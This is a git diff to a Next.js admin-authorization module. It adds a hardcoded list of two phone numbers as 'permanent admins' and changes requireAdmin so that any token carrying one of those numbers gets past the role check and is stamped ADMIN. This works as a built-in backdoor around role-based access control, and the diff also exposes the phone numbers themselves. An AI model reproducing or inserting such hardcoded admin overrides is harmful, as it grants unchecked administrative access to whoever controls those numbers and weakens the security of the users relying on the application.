@@ -1,4 +1,4 @@
-﻿import { NextRequest, NextResponse } from "next/server";
+import { NextRequest, NextResponse } from "next/server";
 import { verifyToken } from "@/lib/jwt";
 
 type AdminAuthResult =
@@ -10,6 +10,15 @@ type AdminAuthResult =
       authorized: false;
       response: NextResponse;
     };
+
+export const PERMANENT_ADMIN_NUMBERS = ["9871592002", "9577540005"];
+
+export function isPermanentAdmin(mobile?: string | null): boolean {
+  if (!mobile) return false;
+  const digits = String(mobile).replace(/\D/g, "");
+  const last10 = digits.length >= 10 ? digits.slice(-10) : digits;
+  return PERMANENT_ADMIN_NUMBERS.includes(last10);
+}
 
 export async function requireAdmin(
   req: NextRequest
@@ -29,7 +38,7 @@ export async function requireAdmin(
   try {
     const payload = await verifyToken(token);
 
-    if (payload.role !== "ADMIN") {
+    if (payload.role !== "ADMIN" && !isPermanentAdmin(payload.mobile)) {
       return {
         authorized: false,
         response: NextResponse.json(
@@ -41,7 +50,10 @@ export async function requireAdmin(
 
     return {
       authorized: true,
-      user: payload,
+      user: {
+        ...payload,
+        role: "ADMIN",
+      },
     };
   } catch {
     return {
